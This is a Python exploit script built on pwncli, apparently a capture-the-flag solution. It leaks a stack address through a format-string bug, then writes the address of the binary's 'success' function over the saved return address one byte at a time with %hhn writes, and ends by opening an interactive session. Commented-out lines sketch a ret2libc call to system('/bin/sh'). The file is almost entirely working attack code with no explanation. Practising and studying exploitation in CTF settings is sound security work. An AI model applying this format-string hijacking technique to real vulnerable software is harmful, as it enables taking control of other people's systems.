#!/usr/bin/env python
# -*- encoding: utf-8 -*-

from pwncli import *

# use script mode
cli_script()

# get use for obj from gift
io: tube = gift['io'] 
elf: ELF = gift['elf']
libc: ELF = gift.libc

ropper_box = RopperBox()

try:
    if gift.remote:
        libc = ELF("./libc.so.6")
        gift['libc'] = libc
        #ropper_box.add_file("libc", "libc.so.6", arch=RopperArchType.x86_64)
    else:
        pass
        #ropper_box.add_file("libc", "/usr/lib/libc.so.6", arch=RopperArchType.x86_64)
except:
    pass

CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

#pop_rdi_ret = CurrentGadgets.pop_rdi_ret()
#ret = CurrentGadgets.ret()


#putsaddr=int(io.recv(12),16)
#print(libc.sym['puts'])
#libcbase=putsaddr-libc.sym['puts']
#system=libcbase+libc.sym['system']
#binsh=libcbase+next(libc.search(b"/bin/sh"))

# sla('choose?', '4')
addr = elf.sym['success']
print('success addr:', hex(addr))
addr = p32(addr)

sl('3')
payload = '%1$p\n'
sa('to talk:', payload)
ru(' said: \n')
stack_addr = int(ru(b'\n'), 16)
print('stack addr:', hex(stack_addr))
ret_addr = stack_addr + 0x40
ru('ignore', )

payloads = []
for i, ad in enumerate(addr):
    if ad >= 4:  # 0
        payloads.append(p32(ret_addr+i) + (f'%{ad-4}c'.encode() if ad-4 else b'') + b'%7$hhn')
    else:
        _fmt = '%7$hhn'
        _len = (ad+len(_fmt))//4
        fmt = f'%{_len+7}$hhn'
        payloads.append(f'%{ad}c'.encode() + fmt.encode() + f'%{(_len*4-ad-len(fmt))}c'.encode() + p32(ret_addr+i))

#payload += 0x1bf52.to_bytes(4, 'little')  # CALL givemeshell
for i in payloads:
    sl('3')
    sa('to talk:', i)
    ru('ignore', )

#sla('key:', b'+')
ia()

